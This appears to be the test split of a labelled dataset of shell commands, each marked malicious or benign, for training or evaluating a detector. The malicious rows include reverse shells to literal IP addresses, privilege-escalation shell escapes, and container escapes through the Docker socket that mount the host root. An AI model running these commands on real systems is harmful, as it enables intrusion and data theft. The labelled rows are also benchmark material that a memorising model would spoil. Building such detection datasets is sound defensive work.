id,command,label,source,split
d1_000474,"php -r '$yp4x_1=fsockopen(""218.27.108.239"",9001);$yp4x_2=proc_open(""/usr/bin/sh"", array(0=>$yp4x_1, 1=>$yp4x_1, 2=>$yp4x_1),$yp4x_2);'",1,quasarnix,test
d1_000498,apparmor_parser,1,hacktricks,test
d1_000510,cat auth.ini | grep -v '^$',0,bash_instruct,test
d1_000512,pacman -Q package-name,0,linlm,test
d1_000523,"cut -d',' -f3 input.csv | sort -u -n > unique_sorted_column3.txt",0,bash6k,test
d1_000533,cat payment.yaml | wc -l,0,bash_instruct,test
d1_000536,chmod 744 auth.yaml,0,bash_instruct,test
d1_000549,cat file | xclip,0,nl2bash,test
d1_000559,betty unzip archive.tar.gz,0,tldr,test
d1_000565,jp2a --output=path/to/output_file.txt path/to/image.jpeg,0,tldr,test
d1_000579,mv *.js tests/,0,bash_instruct,test
d1_000581,cat schema.conf | sed 's/[[:space:]]*$//',0,bash_instruct,test
d1_000592,stat audit.tmp,0,bash_instruct,test
d1_000593,cat payload.tsv | wc -l,0,bash_instruct,test
d1_000604,cat order.log | sort -u,0,bash_instruct,test
d1_000607,export SSLKEYLOGFILE=/tmp/sslkeys.log,1,hacktricks,test
d1_000617,mv migration.conf bin/,0,bash_instruct,test
d1_000619,glab issue reopen issue_number,0,tldr,test
d1_000631,cat results2.txt | xargs -I{} ln -s {} ~/newlinks,0,nl2bash,test
d1_000632,mkdir -p ~/backup_2023,0,bash6k,test
d1_000633,"nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H ""HashPlaceholder"" -d ""YourDOMAIN""",1,hacktricks,test
d1_000634,mkdir -p /path/to/temp-dir/action.d/,1,gtfobins,test
d1_000638,"[ ! -z ""$COMMAND"" ] && echo VERSIONSTART ""$p"" ""$(""${COMMAND%%[[:space:]]*}"" $VERSION_OPTION 2>&1)"" VERSIONEND",1,hacktricks,test
d1_000642,mv -n profile.yaml profile.yaml.old,0,bash_instruct,test
d1_000645,PYTHONPATH=/tmp/pylib python3 -c 'import htmod',1,hacktricks,test
d1_000646,"join -t "" "" -j 1 <(sort file1) <(sort file2)",0,nl2bash,test
d1_000652,gh pr [new|create] [-f|--fill],0,tldr,test
d1_000656,find . -regex './kt[0-9] ',0,nl2bash,test
d1_000659,numlockx off,0,tldr,test
d1_000660,cat schema.log | tr ' ' '\n' | sort | uniq -c | sort -nr | head -n 5,0,bash_instruct,test
d1_000664,"sudo grep -R ""^Environment=.*"" /etc/systemd/system /lib/systemd/system 2>/dev/null | sed 's/\x00/\n/g'",1,hacktricks,test
d1_000681,cp -u summary.zip releases/,0,bash_instruct,test
d1_000682,head -n 20 migration.zip,0,bash_instruct,test
d1_000683,vitest,0,tldr,test
d1_000693,procs --tree,0,tldr,test
d1_000694,yarn --cwd .,1,gtfobins,test
d1_000695,chmod +x product.zip,0,bash_instruct,test
d1_000698,"sqlite3 /var/www/file_hashes.db ""CREATE TABLE IF NOT EXISTS file_hashes(path TEXT PRIMARY KEY, md5 TEXT);""",0,bash6k,test
d1_000706,cat profile.txt | tr 'a-z' 'A-Z',0,bash_instruct,test
d1_000717,ppmtoppm < path/to/image.ppm > path/to/output.ppm,0,tldr,test
d1_000718,sed 's/success/warning/g' build.json,0,bash_instruct,test
d1_000720,systemctl status postgresql,0,bash_instruct,test
d1_000722,"echo ""[Unit]"" > /tmp/atomic_tmp.service",1,atomic_red_team,test
d1_000726,chmod +x /tmp/helper,1,hacktricks,test
d1_000728,qm [sho|showcmd] 100,0,tldr,test
d1_000731,dvc destroy [-f|--force],0,tldr,test
d1_000735,next telemetry,0,tldr,test
d1_000737,chmod +x /tmp/report.pdf.sh,1,atomic_red_team,test
d1_000741,chmod +x data.txt,0,bash_instruct,test
d1_000742,cal -m month,0,tldr,test
d1_000743,"git show --stat --oneline HEAD | tail -n1 | awk '{print ""Added:"" $4 "", Removed:"" $6 "", Files:"" $1}'",0,bash6k,test
d1_000752,opencode session list,0,tldr,test
d1_000759,"find ./ -type f -name ""$2"" -exec sed -i ""s/$3/$4/g"" {} \;",0,nl2bash,test
d1_000765,file data.tmp,0,bash_instruct,test
d1_000773,docker [rmi|image rm] --no-prune image,0,tldr,test
d1_000774,grep 'deprecated' error.log | sort -u,0,bash_instruct,test
d1_000775,cat session.tsv | grep -v '^$',0,bash_instruct,test
d1_000776,"/debug/tcpdump --filter=""udp port 1234"" --file-name=""test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh""",1,hacktricks,test
d1_000779,tar -czf - vendor | ssh bob@api.example.org 'cat > /backup/vendor.tar.gz',0,bash_instruct,test
d1_000796,pueue kill [-a|--all],0,tldr,test
d1_000799,tar -czf /backups/app_logs_$(date +%F).tar.gz -C /var/log/app $(find . -name '*.log' -type f -mtime +30 -printf '%P\n');,0,bash6k,test
d1_000806,in2csv data.xls,0,tldr,test
d1_000811,"grep -H ""ERROR"" /var/log/*.log",0,bash6k,test
d1_000816,"get_version ""/\S+/srm/bin/vmware-dr($|\s)"" --version",1,hacktricks,test
d1_000823,"sed 's/\t/,/g' payload.md > payload.md.csv",0,bash_instruct,test
d1_000824,ip link set eth0 nomaster,0,linlm,test
d1_000825,echo ldapadd -H ldap://example.test:389 -x -D admin@example.test -w s3CurePssw0rD! -f tempadmin.ldif,1,atomic_red_team,test
d1_000835,tracepath -l packet_length host,0,tldr,test
d1_000860,"alias rm5g=""find / -type f -name *.tar -size +5G -exec rm -i {} \;""",0,nl2bash,test
d1_000861,grep -oE '(INFO|WARN|ERROR|DEBUG)' server.log | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_000862,sed -i 's/PUT/token/g' dump.tsv,0,bash_instruct,test
d1_000866,bzip2 path/to/file_to_compress,0,tldr,test
d1_000869,"sed -n '10,20p' customer.yaml",0,bash_instruct,test
d1_000875,cap_net_raw user1,1,hacktricks,test
d1_000882,"yes '' | ruby -e ""$(curl -fsSL https://h658b4b87.example.net/Homebrew/homebrew/go/install)""",0,nl2bash,test
d1_000894,kubectl delete [deploy|deployments] deployment_name,0,tldr,test
d1_000902,find . -perm 777,0,bash6k,test
d1_000913,hledger [acc|accounts] [-d|--declared],0,tldr,test
d1_000915,"ldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b ""CN=Users,DC=example,DC=test"" -s sub -a always -z 1000 dn",1,atomic_red_team,test
d1_000917,nsenter --net=/proc/1/ns/net ip a 2>/dev/null,1,hacktricks,test
d1_000918,osmium tags-filter path/to/input.pbf wr/building [-o|--output] path/to/output.pbf,0,tldr,test
d1_000926,Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...,1,hacktricks,test
d1_000928,cd /tmp/T1030; split -b 5000000 T1030_urandom,1,atomic_red_team,test
d1_000929,yay -S simplenote,0,linlm,test
d1_000931,bru run file.bru,0,tldr,test
d1_000942,k8s-unused-secret-detector [-n|--namespace] namespace | kubectl delete secrets [-n|--namespace] namespace,0,tldr,test
d1_000943,mv *.txt public/,0,bash_instruct,test
d1_000949,chmod 744 credentials.tar.gz,0,bash_instruct,test
d1_000955,flux check --pre,0,tldr,test
d1_000962,devpod up github.com/user/repo [-i|--ide] vscode,0,tldr,test
d1_000969,find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50,1,hacktricks,test
d1_000978,"az provider list --query ""[?namespace=='Microsoft.Network'].resourceTypes[].resourceType""",0,tldr,test
d1_000983,dnsrecon [-d|--domain] example.com --db path/to/database.sqlite,0,tldr,test
d1_000991,sh -i >& /dev/udp/example.com/4242 0>&1,1,slp,test
d1_000999,wc -l schema.yaml,0,bash_instruct,test
d1_001017,sudo nft list ruleset 2>/dev/null | head -n 80,1,hacktricks,test
d1_001019,find /home/calvin/ -mmin -45,0,nl2bash,test
d1_001021,ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash,1,hacktricks,test
d1_001028,fwupdmgr get-history,0,tldr,test
d1_001032,tika-server,0,linlm,test
d1_001038,lzip [-t|--test] path/to/archive.lz,0,tldr,test
d1_001041,aptitude changelog aptitude,1,gtfobins,test
d1_001042,cp export.log migrations/,0,bash_instruct,test
d1_001050,bun init [-r|--react],0,tldr,test
d1_001055,ignite new project_name,0,tldr,test
d1_001062,az logout --username alias@example.com,0,tldr,test
d1_001066,scp release.bak alice@cdn.example.com:/tmp/,0,bash_instruct,test
d1_001068,qm [del|delsnapshot] 100 snapshot_name,0,tldr,test
d1_001072,sudo chgrp backup access.tmp,0,bash_instruct,test
d1_001073,podman inspect $(podman ps -l -q --filter ancestor=t1613),1,atomic_red_team,test
d1_001077,dwebp path/to/input.webp -o path/to/output.png -mt,0,tldr,test
d1_001083,xxd -l 64 order.py,0,bash_instruct,test
d1_001086,TOKEN=$(cat /host-var/lib/kubelet/pods/mypod/volumes/kubernetes.io~projected/myvol/token 2>/dev/null),1,hacktricks,test
d1_001090,rm $1*.bin,1,hacktricks,test
d1_001094,nix-env --help --option_name,0,tldr,test
d1_001095,geth --mine,0,tldr,test
d1_001096,cat migration.txt | grep -v '^$',0,bash_instruct,test
d1_001109,element-desktop,0,linlm,test
d1_001113,"wrk [-t|--threads] 2 [-c|--connections] 5 [-d|--duration] 5s [-H|--header] ""Host: example.com"" ""http://h0caaf24a.example.net/index.html""",0,tldr,test
d1_001114,$which_openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip,1,atomic_red_team,test
d1_001115,cat /proc/interrupts,0,linlm,test
d1_001117,ksu -q -e /bin/sh,1,gtfobins,test
d1_001121,"perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec ""/bin/sh""'",1,gtfobins,test
d1_001125,version=$(mvn org.apache.maven.plugins:maven-help-plugin:2.1.1:evaluate -Dexpression=project.version | egrep -v '^\[|Downloading:' | tr -d ' \n' | sed -E 's/\[.*\]//g'),0,nl2bash,test
d1_001131,skopeo copy docker://registry_hostname/image:tag dir:path/to/directory,0,tldr,test
d1_001137,"curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{""Image"":""ubuntu:24.04"",""Cmd"":[""id""],""HostConfig"":{""Binds"":[""/:/host""]}}' -X POST http://h33438904.example.net/v1.54/containers/create",1,hacktricks,test
d1_001138,sort product.txt | uniq -c | sort -nr,0,bash_instruct,test
d1_001141,autopep8 --diff path/to/file,0,tldr,test
d1_001142,sudo chgrp mysql output.old,0,bash_instruct,test
d1_001150,sudo pacman -S shotcut,0,linlm,test
d1_001154,chmod +x payment.gz,0,bash_instruct,test
d1_001160,sudo lvreduce [-L|--size] 120G logical_volume,0,tldr,test
d1_001168,sudo chgrp operators customer.py,0,bash_instruct,test
d1_001179,sudo chown svc-app report.gz,0,bash_instruct,test
d1_001198,useradd -m newuser,0,bash6k,test
d1_001200,head -1 first.csv > merged.csv; tail -n +2 *.csv >> merged.csv,0,bash6k,test
d1_001204,pio device monitor [-p|--port] /dev/ttyUSBX,0,tldr,test
d1_001206,compopt command,0,tldr,test
d1_001209,cp auth.json auth.json.bak,0,bash_instruct,test
d1_001210,"cal | awk 'NR==2 {for (i=1;i<=NF;i++) {sub(/ /,"""",$i);a[$i]=i}} NR>2 {if ($a[""Tu""]~/[0-9]/) {printf ""%02d\n"",$a[""Tu""];exit}}' FIELDWIDTHS=""3 3 3 3 3 3 3 3""",0,nl2bash,test
d1_001221,cat index.html | pup 'div json{}',0,tldr,test
d1_001223,"peludna-prognoza ""city""",0,tldr,test
d1_001224,dumpe2fs -x /dev/sdXN,0,tldr,test
d1_001227,dc -e '!/bin/sh',1,gtfobins,test
d1_001229,"glab mr create [-b|--target-branch] target_branch [-t|--title] ""title"" [-d|--description] ""description""",0,tldr,test
d1_001231,"rgpt --v --i ""$(git diff path/to/file)""",0,tldr,test
d1_001236,command --quiet,0,linlm,test
d1_001241,head -n 1 data.zip,0,bash_instruct,test
d1_001242,docker run --name chronograf -p 8888:8888 -d chronograf,0,linlm,test
d1_001252,w -h svc-app,0,bash_instruct,test
d1_001254,0<&3;exec 3<>/dev/udp/52.17.33.75/8888; /usr/bin/bash <&3 >&3 2>&3,1,quasarnix,test
d1_001259,cat metrics.txt | sort | uniq,0,bash_instruct,test
d1_001260,redis-server path/to/redis.conf,0,tldr,test
d1_001266,0<&3;exec 3<>/dev/udp/10.77.16.215/80; /usr/bin/sh <&3 >&3 2>&3,1,quasarnix,test
d1_001268,sudo chown ec2-user profile.log,0,bash_instruct,test
d1_001273,gobuster dns [-do|--domain] example.com [-w|--wordlist] path/to/file,0,tldr,test
d1_001287,cat dump.tsv | sort | uniq -c | sort -nr,0,bash_instruct,test
d1_001291,git effort path/to/file_or_directory1 path/to/file_or_directory2 ...,0,tldr,test
d1_001299,sudo busctl capture > system-bus.pcapng,1,hacktricks,test
d1_001300,sudo aptitude update,0,tldr,test
d1_001307,cd $(dirname `which oracle`),0,nl2bash,test
d1_001308,"php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'",1,gtfobins,test
d1_001313,sudo chown -R dave:admin migrations,0,bash_instruct,test
d1_001341,mv dump.yaml tmp/,0,bash_instruct,test
d1_001344,mv -n order.png order.png.old,0,bash_instruct,test
d1_001345,cat release.txt | wc -l,0,bash_instruct,test
d1_001347,/usr/bin/bash -i 3<> /dev/tcp/113.208.108.30/8000 0<&3 1>&3 2>&3,1,quasarnix,test
d1_001356,depmod kernel_version,0,tldr,test
d1_001357,"find . -type d | sed -e 's/^\.\///g' -e 's/^\./avoid/g' | grep -v avoid | awk '{print $1""\t""$1}' | xargs chgrp",0,nl2bash,test
d1_001359,rlwrap /bin/sh,1,gtfobins,test
d1_001360,curl --unix-socket /run/app/app.sock -i http://h33438904.example.net/admin,1,hacktricks,test
d1_001363,"find /home/mine -iname ""*.png"" -execdir cp {} /home/mine/pngcoppies/copy{} \;",0,nl2bash,test
d1_001370,rpicam-hello [-t|--timeout] time,0,tldr,test
d1_001390,Label=unconfined,1,hacktricks,test
d1_001395,find /foldername | sort -n | tail -1,0,nl2bash,test
d1_001396,ls -1 build | wc -l,0,bash_instruct,test
d1_001398,sudo localectl set-keymap us,0,linlm,test
d1_001399,chmod 644 account.jpg,0,bash_instruct,test
d1_001402,diskutil repairVolume /dev/disk,0,tldr,test
d1_001404,sudo opensnoop,0,tldr,test
d1_001407,sort server.ini | uniq -c | sort -nr,0,bash_instruct,test
d1_001414,aws secretsmanager rotate-secret --secret-id name|arn --rotation-lambda-arn arn_of_lambda_function,0,tldr,test
d1_001416,dolt branch --show-current,0,tldr,test
d1_001420,bun outdated [-r|--recursive],0,tldr,test
d1_001421,touch auth.png,0,bash_instruct,test
d1_001443,ls -l /etc/profile /etc/profile.d/,1,hacktricks,test
d1_001445,"find . \( -name ""*.c"" -or -name ""*.cpp"" -or -name ""*.h"" -or -name ""*.m"" \) -print0 | xargs -0 wc",0,nl2bash,test
d1_001448,dd if=file.bin bs=28 skip=1 of=blob,1,hacktricks,test
d1_001449,gcov path/to/file.cpp,0,tldr,test
d1_001450,act [-l|--list],0,tldr,test
d1_001453,chmod 744 dump.md,0,bash_instruct,test
d1_001465,"sed 's/\t/,/g' backup.ini > backup.ini.csv",0,bash_instruct,test
d1_001473,apropos regex_1 [-a|--and] regex_2 [-a|--and] regex_3,0,tldr,test
d1_001479,aws-vault add profile,0,tldr,test
d1_001502,sudo systemd-run command argument1 argument2 ...,0,tldr,test
d1_001505,cp -u response.sql tmp/,0,bash_instruct,test
d1_001508,yarn exec /bin/sh,1,gtfobins,test
d1_001510,MAX_FILE_SIZE=size_in_megabytes http-server-upload,0,tldr,test
d1_001516,wondershaper -s -a adapter_name,0,tldr,test
d1_001526,find . -name '*.js' -not -path '*exclude/this/dir*',0,nl2bash,test
d1_001530,"RSHELL=""ncat $LMTHD 85.67.42.74 4444 -e \""/bin/bash -c id;/bin/bash\"" 2>/dev/null""",1,payloads,test
d1_001532,bc -s /path/to/input-file,1,gtfobins,test
d1_001536,0 2 * * * mysqldump prod | gzip > /backup/prod_$(date +\%F).sql.gz && ls -1t /backup/prod_*.sql.gz | tail -n +8 | xargs -r rm -f,0,bash6k,test
d1_001541,./dump-memory.sh 2027,1,hacktricks,test
d1_001545,find <directory> -type f -size -1M -delete,0,nl2bash,test
d1_001549,ss -lntp | grep '76.132.177.92',1,hacktricks,test
d1_001550,cat inventory.log | sort -u,0,bash_instruct,test
d1_001553,find /var/www -type f -name '*.md' -print0 | xargs -0 rm -f,0,bash_instruct,test
d1_001556,mate-about --version,0,tldr,test
d1_001559,docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts,1,hacktricks,test
d1_001562,halt -p,1,atomic_red_team,test
d1_001564,sudo chown -R ec2-user:wheel build,0,bash_instruct,test
d1_001577,"find . -type f -name ""*.java"" | xargs tar cvf myfile.tar",0,nl2bash,test
d1_001579,find /path/to/dir ! -perm 0644 -exec chmod 0644 {} \;,0,nl2bash,test
d1_001597,perl -e 'print `/bin/bash`',1,slp,test
d1_001599,find . -print,0,nl2bash,test
d1_001603,"curl --unix-socket /var/run/docker.sock -X POST ""http://h33438904.example.net/v1.47/containers/${HELPER}/start""",1,hacktricks,test
d1_001613,linode-cli linodes delete linode_id,0,tldr,test
d1_001636,difft --syntax-highlight on|off path/to/file1 path/to/file2,0,tldr,test
d1_001640,[ -f invoice.md ] && cat invoice.md || echo 'not found',0,bash_instruct,test
d1_001643,shelly install package,0,tldr,test
d1_001644,"tar -czf /fss/fi/outfile.tar.gz `find /fss/fin -d 1 -type d -name ""*"" -print`",0,nl2bash,test
d1_001653,sensible-browser url,0,tldr,test
d1_001656,linux-vdso.so.1 => (0x00007fffa2dde000),1,hacktricks,test
d1_001666,chmod go-w server.old,0,bash_instruct,test
d1_001667,pio system prune --cache,0,tldr,test
d1_001668,slimrb --erb input.slim output.erb,0,tldr,test
d1_001674,sudo pacman -S visidata,0,linlm,test
d1_001680,"if [[ -d path/to/directory ]]; then echo ""Condition is true""; fi",0,tldr,test
d1_001685,echo ${filename%.*},0,nl2bash,test
d1_001686,pip debug --abi abi,0,tldr,test
d1_001687,knock hostname portnumber:protocol,0,tldr,test
d1_001691,wc --files0-from /path/to/input-file,1,gtfobins,test
d1_001692,mv -n server.xml server.xml.old,0,bash_instruct,test
d1_001695,sudo pkill -SIGTERM ^cron$,1,atomic_red_team,test
d1_001696,xgettext [-h|--help],0,tldr,test
d1_001697,wc -w request.md,0,bash_instruct,test
d1_001704,cat /sys/class/net/eth0/statistics/rx_bytes && cat /sys/class/net/eth0/statistics/tx_bytes,0,bash6k,test
d1_001708,sed 's/^/./' | rev | cut -d. -f2- | rev | cut -c2-,0,nl2bash,test
d1_001718,grep 'traceback' request.log | sort -u,0,bash_instruct,test
d1_001720,"curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -d '{""Image"":""ubuntu:24.04"",""Cmd"":[""sleep"",""3600""],""HostConfig"":{""Binds"":[""/:/host:rw""]}}' -X POST http://h33438904.example.net/v1.54/containers/create?name=helper",1,hacktricks,test
d1_001731,sort -k2 -n customer.conf,0,bash_instruct,test
d1_001732,stat -c '%a' output.css,0,bash_instruct,test
d1_001736,find . -name core -ctime +4 -exec /bin/rm -f {} \;,0,nl2bash,test
d1_001738,"buildctl --addr unix:///run/buildkit/buildkitd.sock build --frontend dockerfile.v0 --local context=. --local dockerfile=. --allow network.host --allow security.insecure --output type=local,dest=/tmp/buildkit-out",1,hacktricks,test
d1_001745,transcode -J stabilize -i input_file,0,tldr,test
d1_001753,chmod go-w index.log,0,bash_instruct,test
d1_001758,tar -czf - tmp | ssh backup@backup.example.com 'cat > /backup/tmp.tar.gz',0,bash_instruct,test
d1_001764,sudo importctl pull-tar url path/to/directory,0,tldr,test
d1_001770,wc -c product.tmp,0,bash_instruct,test
d1_001772,/usr/bin/bash -i 3<> /dev/udp/78.190.62.27/9465 0<&3 1>&3 2>&3,1,quasarnix,test
d1_001774,instaloader [-F|--fast-update] profile_name,0,tldr,test
d1_001777,[ -f data.sh ] && cat data.sh || echo 'not found',0,bash_instruct,test
d1_001778,tail -n 20 debug.tmp,0,bash_instruct,test
d1_001781,find /host -maxdepth 2 -ls 2>/dev/null | head,1,hacktricks,test
d1_001785,setlock - /bin/sh -p,1,gtfobins,test
d1_001802,run-parts --test /etc/cron.hourly,1,hacktricks,test
d1_001804,base58 /path/to/input-file | base58 --decode,1,gtfobins,test
d1_001808,"zip $HOME/data.zip /var/log/{w,b}tmp",1,atomic_red_team,test
d1_001811,macchina --ascii-artists,0,tldr,test
d1_001839,cp changelog.bak changelog.bak.bak,0,bash_instruct,test
